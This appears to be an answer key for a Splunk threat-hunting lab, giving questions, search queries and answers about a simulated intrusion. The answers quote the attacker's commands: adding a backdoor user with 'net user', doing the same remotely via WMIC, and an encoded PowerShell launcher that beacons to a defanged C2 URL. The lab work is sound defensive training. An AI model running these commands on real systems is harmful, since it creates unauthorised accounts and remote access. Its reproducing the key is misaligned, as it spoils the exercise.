@@ -1,0 +1,38 @@
+///TASK 1///
+Q: How many events were collected and Ingested in the index main?
+** 
+A: 12256
+===
+Q: On one of the infected hosts, the adversary was successful in creating a backdoor user. What is the new username?
+** index=main AccountType=User EventID="1" Hostname="Micheal.Beaven" >>  CommandLine: C:\windows\system32\net1 user /add A1berto paw0rd1 
+A: A1berto
+===
+Q: On the same host, a registry key was also updated regarding the new backdoor user. What is the full path of that registry key?
+** index=main extracted_EventType=SetValue Hostname="Micheal.Beaven" >> found in serach results
+A: HKLM\SAM\SAM\Domains\Account\Users\Names\A1berto\
+===
+Q: Examine the logs and identify the user that the adversary was trying to impersonate.
+** 
+A: Alberto
+===
+Q: What is the command used to add a backdoor user from a remote computer?
+** 
+A: C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"
+===
+Q: How many times was the login attempt from the backdoor user observed during the investigation?
+** 
+A: 0
+===
+Q: What is the name of the infected host on which suspicious Powershell commands were executed?
+** 
+A: James.browne 
+===
+Q: PowerShell logging is enabled on this device. How many events were logged for the malicious PowerShell execution?
+** 
+A: 79
+===
+Q: An encoded Powershell script from the infected host initiated a web request. What is the full URL?
+** index=main Channel="Windows PowerShell" Hostname="James.browne" >> Copy below C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc >> cyberchecf >> from base 64 >> read output >> [TeXT.ENCodiNG]::UnicodE.GetStriNG([CoNVeRT]::FroMBASe64StRInG('aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==')));$t='/news.php';$7A6Ed.HEAders.Add('User-Agent',$u);$7a6Ed.PROxY=
+Follow steps and get below
+A: hxxp[://]10[.]10[.]10[.]5/news[.]php
+===
